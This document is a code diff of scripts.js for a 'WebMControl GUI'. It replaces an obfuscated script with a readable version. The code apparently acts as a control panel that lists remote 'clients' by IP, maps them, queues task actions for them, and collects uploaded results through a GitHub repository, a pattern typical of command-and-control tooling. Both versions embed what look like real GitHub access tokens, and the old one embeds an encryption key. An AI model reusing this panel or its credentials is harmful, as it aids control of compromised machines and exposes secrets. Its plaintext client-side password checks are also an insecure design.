@@ -1,1 +1,162 @@
-const _0x4c86c9=_0x256c;(function(_0x5d471c,_0x47b7d4){const _0x55be8b=_0x256c,_0x1f8e9e=_0x5d471c();while(!![]){try{const _0x4e9630=parseInt(_0x55be8b(0x159))/0x1+parseInt(_0x55be8b(0x195))/0x2+parseInt(_0x55be8b(0x17b))/0x3+parseInt(_0x55be8b(0x15d))/0x4+-parseInt(_0x55be8b(0x165))/0x5+-parseInt(_0x55be8b(0x197))/0x6+-parseInt(_0x55be8b(0x184))/0x7;if(_0x4e9630===_0x47b7d4)break;else _0x1f8e9e['push'](_0x1f8e9e['shift']());}catch(_0x30f176){_0x1f8e9e['push'](_0x1f8e9e['shift']());}}}(_0x1aae,0xa83f0));const PAT=_0x4c86c9(0x14f),DATA_REPO=_0x4c86c9(0x168),BASE_URL='https://api.github.com/repos/'+DATA_REPO,HEADERS={'Authorization':_0x4c86c9(0x18d)+PAT,'Accept':_0x4c86c9(0x164),'Content-Type':'application/json'};let ENCRYPTION_KEY=_0x4c86c9(0x16c),cipher=null,currentUser=null;window[_0x4c86c9(0x189)]=()=>{checkLoginStatus();};function checkLoginStatus(){const _0x344596=_0x4c86c9,_0x3e898c=localStorage[_0x344596(0x192)](_0x344596(0x191));_0x3e898c?(currentUser=JSON[_0x344596(0x174)](_0x3e898c),document[_0x344596(0x177)](_0x344596(0x180))[_0x344596(0x1a2)]='User:\x20'+currentUser[_0x344596(0x167)],showMainContent(),fetchClients(),initMap(),setInterval(fetchClients,0xea60),fetchUploads()):document[_0x344596(0x177)](_0x344596(0x16f))[_0x344596(0x170)][_0x344596(0x198)]=_0x344596(0x15f);}async function attemptLogin(){const _0x12c013=_0x4c86c9,_0x5ef735=document[_0x12c013(0x177)](_0x12c013(0x167))[_0x12c013(0x183)],_0x501e20=document[_0x12c013(0x177)](_0x12c013(0x16e))[_0x12c013(0x183)],_0x17cf83=document[_0x12c013(0x177)](_0x12c013(0x15b));try{const _0x38c38e=await fetch(BASE_URL+_0x12c013(0x190),{'headers':HEADERS}),_0x221f78=await _0x38c38e[_0x12c013(0x16a)](),_0x45255c=atob(_0x221f78[_0x12c013(0x17d)]['replace'](/\n/g,'')),_0xd2d014=JSON[_0x12c013(0x174)](_0x45255c)[_0x12c013(0x161)],_0x2270b1=_0xd2d014[_0x12c013(0x185)](_0x1e57bb=>_0x1e57bb[_0x12c013(0x167)]===_0x5ef735&&_0x1e57bb[_0x12c013(0x16e)]===_0x501e20);_0x2270b1?(currentUser=_0x2270b1,localStorage[_0x12c013(0x1a4)](_0x12c013(0x191),JSON[_0x12c013(0x154)](_0x2270b1)),document['getElementById'](_0x12c013(0x16f))[_0x12c013(0x170)]['display']='none',document[_0x12c013(0x177)](_0x12c013(0x180))[_0x12c013(0x1a2)]=_0x12c013(0x151)+_0x5ef735,showMainContent(),fetchClients(),initMap(),setInterval(fetchClients,0xea60),fetchUploads()):_0x17cf83[_0x12c013(0x1a2)]=_0x12c013(0x178);}catch(_0x2082b0){console[_0x12c013(0x158)](_0x12c013(0x179),_0x2082b0),_0x17cf83['textContent']='Failed\x20to\x20authenticate.\x20Check\x20console\x20for\x20details.';}}function showMainContent(){const _0x4a2751=_0x4c86c9;document[_0x4a2751(0x177)](_0x4a2751(0x1a1))[_0x4a2751(0x170)]['display']='block',document[_0x4a2751(0x177)](_0x4a2751(0x163))[_0x4a2751(0x170)]['display']=_0x4a2751(0x162);}function logout(){const _0x201117=_0x4c86c9;localStorage[_0x201117(0x181)](_0x201117(0x191)),currentUser=null,document['getElementById'](_0x201117(0x1a1))[_0x201117(0x170)]['display']=_0x201117(0x19c),document[_0x201117(0x177)](_0x201117(0x163))['style'][_0x201117(0x198)]=_0x201117(0x19c),document['getElementById'](_0x201117(0x16f))['style'][_0x201117(0x198)]=_0x201117(0x15f),document[_0x201117(0x177)](_0x201117(0x167))[_0x201117(0x183)]='',document[_0x201117(0x177)](_0x201117(0x16e))[_0x201117(0x183)]='',document[_0x201117(0x177)](_0x201117(0x15b))[_0x201117(0x1a2)]='';}function _0x256c(_0x5b1ab0,_0x14a5f9){const _0x1aae6a=_0x1aae();return _0x256c=function(_0x256c8f,_0x3c7dfd){_0x256c8f=_0x256c8f-0x14f;let _0x3bb824=_0x1aae6a[_0x256c8f];return _0x3bb824;},_0x256c(_0x5b1ab0,_0x14a5f9);}async function fetchClients(){const _0x28a989=_0x4c86c9;if(!currentUser)return;try{const _0x493349=await fetch(BASE_URL+_0x28a989(0x188),{'headers':HEADERS}),_0x1da2a9=await _0x493349[_0x28a989(0x16a)](),_0x410d1e=document[_0x28a989(0x177)](_0x28a989(0x153));_0x410d1e['innerHTML']='',_0x1da2a9['forEach'](_0x428eb6=>{const _0x9cb38d=_0x28a989,_0x10f2d9=document[_0x9cb38d(0x16d)]('li');_0x10f2d9['textContent']=_0x428eb6['name'][_0x9cb38d(0x17f)]('.json',''),_0x10f2d9[_0x9cb38d(0x18c)]=()=>loadClientDetails(_0x428eb6[_0x9cb38d(0x1a3)][_0x9cb38d(0x17f)](_0x9cb38d(0x172),'')),_0x410d1e[_0x9cb38d(0x187)](_0x10f2d9);}),_0x1da2a9['length']>0x0&&document[_0x28a989(0x177)]('dingSound')[_0x28a989(0x157)]()[_0x28a989(0x150)](_0x558f1b=>console[_0x28a989(0x18a)]('Audio\x20error:',_0x558f1b));}catch(_0x22810b){console[_0x28a989(0x158)]('Error\x20fetching\x20clients:',_0x22810b);}}async function loadClientDetails(_0x52bd31){const _0x180ced=_0x4c86c9;try{const _0x27e756=await fetch(BASE_URL+_0x180ced(0x19f)+_0x52bd31+_0x180ced(0x172),{'headers':HEADERS}),_0x48d300=await _0x27e756[_0x180ced(0x16a)](),_0x496915=atob(_0x48d300[_0x180ced(0x17d)][_0x180ced(0x17f)](/\n/g,'')),_0x5a95fc=JSON[_0x180ced(0x174)](_0x496915);document[_0x180ced(0x177)](_0x180ced(0x186))[_0x180ced(0x1a5)]=_0x180ced(0x19a)+_0x52bd31+_0x180ced(0x155)+_0x5a95fc[_0x180ced(0x167)]+_0x180ced(0x182)+_0x5a95fc['ip']+'</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>Status:\x20'+_0x5a95fc[_0x180ced(0x199)]+'</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20',fetchResults(_0x52bd31),updateMap(_0x5a95fc['ip']);}catch(_0x27b833){console[_0x180ced(0x158)](_0x180ced(0x19e),_0x27b833);}}function _0x1aae(){const _0x493514=['/contents/clients','onload','log','Error\x20submitting\x20task:','onclick','token\x20','Invalid\x20JSON\x20for\x20parameters!','split','/contents/data/accounts.json','currentUser','getItem','Add\x20task\x20for\x20','taskParams','2092898eEjeKg','filter','5509152kOumdc','display','status','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>','download_url','none','slice','Error\x20loading\x20client\x20details:','/contents/clients/','</a>','mainHeader','textContent','name','setItem','innerHTML','.css','trim','Error\x20fetching\x20results:','forEach','substring','...','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','catch','User:\x20','toISOString','clientList','stringify','</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>Username:\x20','/contents/results','play','error','783425jAnyaE','<a\x20href=\x22','loginError','sha','3123208nyUtIq','PUT','block','\x22\x20target=\x22_blank\x22>','users','flex','mainContainer','application/vnd.github.v3+json','5151025YUbNAB','Task\x20submitted\x20successfully!','username','ac-dash/WebMControl-Data','href','json','includes','ifyouscaredgetthefuckoutthepit','createElement','password','loginModal','style','themeSelect','.json','taskResults','parse','Error\x20fetching\x20uploads:','Select\x20a\x20system\x20first!','getElementById','Invalid\x20username\x20or\x20password.','Login\x20error:','taskAction','783768sgVzDg','theme','content','/contents/management/tasks.json','replace','loggedInUser','removeItem','</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>IP:\x20','value','1640793OqSlBK','find','clientDetails','appendChild'];_0x1aae=function(){return _0x493514;};return _0x1aae();}async function fetchResults(_0x55e1d4){const _0x4e1e3c=_0x4c86c9;try{const _0x1a28be=await fetch(BASE_URL+_0x4e1e3c(0x156),{'headers':HEADERS}),_0x9bb557=await _0x1a28be[_0x4e1e3c(0x16a)](),_0x5278be=_0x9bb557[_0x4e1e3c(0x196)](_0x22e97b=>_0x22e97b[_0x4e1e3c(0x1a3)][_0x4e1e3c(0x16b)](_0x55e1d4)),_0x35b8ab=document['getElementById'](_0x4e1e3c(0x173));_0x35b8ab[_0x4e1e3c(0x1a5)]='',_0x5278be[_0x4e1e3c(0x19d)](-0xa)[_0x4e1e3c(0x1a9)](async _0x649836=>{const _0x5d1f77=_0x4e1e3c,_0x501826=await fetch(_0x649836[_0x5d1f77(0x19b)],{'headers':HEADERS}),_0xf24736=await _0x501826['text'](),_0x57eda6=document[_0x5d1f77(0x16d)]('p');_0x57eda6[_0x5d1f77(0x1a2)]=_0x649836[_0x5d1f77(0x1a3)]+':\x20'+_0xf24736[_0x5d1f77(0x1aa)](0x0,0x64)+_0x5d1f77(0x1ab),_0x35b8ab[_0x5d1f77(0x187)](_0x57eda6);});}catch(_0x23605b){console['error'](_0x4e1e3c(0x1a8),_0x23605b);}}async function fetchUploads(){const _0x902029=_0x4c86c9;try{const _0x219843=await fetch(BASE_URL+_0x902029(0x156),{'headers':HEADERS}),_0x562efa=await _0x219843[_0x902029(0x16a)](),_0x2cb9a9=document[_0x902029(0x177)]('uploadsList');_0x2cb9a9[_0x902029(0x1a5)]='',_0x562efa[_0x902029(0x1a9)](_0x3a1fb7=>{const _0x324c4d=_0x902029,_0x25b3e9=document[_0x324c4d(0x16d)]('li');_0x25b3e9[_0x324c4d(0x1a5)]=_0x324c4d(0x15a)+_0x3a1fb7['download_url']+_0x324c4d(0x160)+_0x3a1fb7[_0x324c4d(0x1a3)]+_0x324c4d(0x1a0),_0x2cb9a9['appendChild'](_0x25b3e9);});}catch(_0x66c39c){console[_0x902029(0x158)](_0x902029(0x175),_0x66c39c);}}async function submitTask(){const _0x46a3a6=_0x4c86c9,_0x29c7c6=document[_0x46a3a6(0x177)](_0x46a3a6(0x186))[_0x46a3a6(0x1a2)][_0x46a3a6(0x18f)]('\x0a')[0x0][_0x46a3a6(0x18f)](':')[0x1]?.[_0x46a3a6(0x1a7)]()||'';if(!_0x29c7c6){alert(_0x46a3a6(0x176));return;}const _0x4733f2=document[_0x46a3a6(0x177)](_0x46a3a6(0x17a))[_0x46a3a6(0x183)],_0x2d374a=document['getElementById'](_0x46a3a6(0x194))['value']||'{}';let _0x39ccbf;try{_0x39ccbf=JSON[_0x46a3a6(0x174)](_0x2d374a);}catch{alert(_0x46a3a6(0x18e));return;}const _0x4c696a={'action':_0x4733f2,'params':_0x39ccbf,'timestamp':new Date()[_0x46a3a6(0x152)]()};try{const _0x45ffaf=await fetch(BASE_URL+'/contents/management/tasks.json',{'headers':HEADERS}),_0x4f7a0b=await _0x45ffaf['json']();let _0xa130be=JSON[_0x46a3a6(0x174)](atob(_0x4f7a0b[_0x46a3a6(0x17d)][_0x46a3a6(0x17f)](/\n/g,'')));if(!_0xa130be[_0x29c7c6])_0xa130be[_0x29c7c6]=[];_0xa130be[_0x29c7c6]['push'](_0x4c696a);const _0x2ec61=btoa(JSON[_0x46a3a6(0x154)](_0xa130be));await fetch(BASE_URL+_0x46a3a6(0x17e),{'method':_0x46a3a6(0x15e),'headers':HEADERS,'body':JSON[_0x46a3a6(0x154)]({'message':_0x46a3a6(0x193)+_0x29c7c6,'content':_0x2ec61,'sha':_0x4f7a0b[_0x46a3a6(0x15c)]})}),alert(_0x46a3a6(0x166));}catch(_0x1b1ea6){console['error'](_0x46a3a6(0x18b),_0x1b1ea6),alert('Failed\x20to\x20submit\x20task.');}}function switchTheme(){const _0x147630=_0x4c86c9,_0x405a40=document[_0x147630(0x177)](_0x147630(0x171))[_0x147630(0x183)];document[_0x147630(0x177)](_0x147630(0x17c))[_0x147630(0x169)]='assets/themes/'+_0x405a40+_0x147630(0x1a6);}
+// scripts.js for WebMControl GUI
+// Handles login, task submission, theme switching, and API interactions with GitHub
+
+const GITHUB_TOKEN = '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';
+const REPO_NAME = 'ac-dash/WebMControl-Data';
+
+// Function to attempt login by fetching accounts.json from GitHub
+async function attemptLogin() {
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+    const url = `https://api.github.com/repos/${REPO_NAME}/contents/data/accounts.json`;
+
+    try {
+        const response = await fetch(url, {
+            headers: {
+                'Authorization': `token ${GITHUB_TOKEN}`,
+                'Accept': 'application/vnd.github.v3+json'
+            }
+        });
+        if (!response.ok) {
+            throw new Error(`API request failed with status ${response.status}`);
+        }
+        const data = await response.json();
+        if (!data.content) {
+            throw new Error('No content field in API response');
+        }
+        // Decode base64 content from GitHub API response
+        const decodedContent = atob(data.content.replace(/\n/g, ''));
+        const accounts = JSON.parse(decodedContent);
+        // Check if user exists with matching credentials
+        const user = accounts.users.find(u => u.username === username && u.password === password);
+        if (user) {
+            // Successful login
+            document.getElementById('loginModal').style.display = 'none';
+            document.getElementById('mainContent').style.display = 'block';
+            alert('Login successful');
+        } else {
+            alert('Invalid username or password');
+        }
+    } catch (error) {
+        console.error('Login error:', error);
+        alert('Failed to login. Check connection or credentials.');
+    }
+}
+
+// Function to submit a task (placeholder for task management functionality)
+async function submitTask() {
+    const clientId = document.getElementById('clientId').value;
+    const taskData = document.getElementById('taskData').value;
+    const url = `https://api.github.com/repos/${REPO_NAME}/contents/data/tasks.json`;
+
+    if (!clientId || !taskData) {
+        alert('Please fill in all fields');
+        return;
+    }
+
+    try {
+        // Fetch existing tasks to append new task (simplified for demo)
+        const response = await fetch(url, {
+            headers: {
+                'Authorization': `token ${GITHUB_TOKEN}`,
+                'Accept': 'application/vnd.github.v3+json'
+            }
+        });
+        if (!response.ok) {
+            throw new Error(`Failed to fetch tasks: ${response.status}`);
+        }
+        const data = await response.json();
+        const decodedContent = atob(data.content.replace(/\n/g, ''));
+        let tasks = JSON.parse(decodedContent);
+        tasks.tasks.push({ clientId, taskData, status: 'pending', timestamp: new Date().toISOString() });
+
+        // Encode back to base64 for updating file (simplified; real update would use PUT with SHA)
+        console.log('Task added locally:', tasks);
+        alert('Task submitted (demo mode - real update requires SHA and PUT request)');
+        // Note: Actual file update logic requires getting file SHA and using PUT endpoint, omitted for brevity
+    } catch (error) {
+        console.error('Task submission error:', error);
+        alert('Failed to submit task.');
+    }
+}
+
+// Function to load uploaded files from uploads/ directory via GitHub API
+async function loadUploadedFiles() {
+    const uploadsList = document.getElementById('uploadsList');
+    const url = `https://api.github.com/repos/${REPO_NAME}/contents/results`;
+
+    uploadsList.innerHTML = '<p>Loading files...</p>';
+    try {
+        const response = await fetch(url, {
+            headers: {
+                'Authorization': `token ${GITHUB_TOKEN}`,
+                'Accept': 'application/vnd.github.v3+json'
+            }
+        });
+        if (!response.ok) {
+            throw new Error(`Failed to fetch uploads: ${response.status}`);
+        }
+        const files = await response.json();
+        if (files.length === 0) {
+            uploadsList.innerHTML = '<p>No files found in uploads directory.</p>';
+            return;
+        }
+        uploadsList.innerHTML = '';
+        files.forEach(file => {
+            const li = document.createElement('li');
+            li.innerHTML = `<a href="${file.download_url}" target="_blank">${file.name}</a>`;
+            uploadsList.appendChild(li);
+        });
+    } catch (error) {
+        console.error('Error loading uploads:', error);
+        uploadsList.innerHTML = '<p>Failed to load uploaded files.</p>';
+    }
+}
+
+// Function to toggle between light and dark themes
+function toggleTheme() {
+    const body = document.body;
+    const themeIcon = document.getElementById('themeIcon');
+    if (body.classList.contains('dark-theme')) {
+        body.classList.remove('dark-theme');
+        body.classList.add('light-theme');
+        themeIcon.textContent = '🌙';
+    } else {
+        body.classList.remove('light-theme');
+        body.classList.add('dark-theme');
+        themeIcon.textContent = '☀️';
+    }
+}
+
+// Event listener for login button (assumes button exists in HTML)
+document.addEventListener('DOMContentLoaded', () => {
+    // Show login modal on page load
+    document.getElementById('loginModal').style.display = 'block';
+    document.getElementById('mainContent').style.display = 'none';
+
+    // Attach event listeners (replace with actual button IDs from your HTML)
+    const loginButton = document.querySelector('#loginModal button');
+    if (loginButton) {
+        loginButton.onclick = attemptLogin;
+    }
+    const themeButton = document.getElementById('themeToggle');
+    if (themeButton) {
+        themeButton.onclick = toggleTheme;
+    }
+    const taskSubmitButton = document.querySelector('#taskForm button');
+    if (taskSubmitButton) {
+        taskSubmitButton.onclick = submitTask;
+    }
+
+    // Load uploaded files if section exists
+    if (document.getElementById('uploadsList')) {
+        loadUploadedFiles();
+    }
+});
+
+// Handle Enter key for login
+document.getElementById('password').addEventListener('keypress', (e) => {
+    if (e.key === 'Enter') {
+        attemptLogin();
+    }
+});
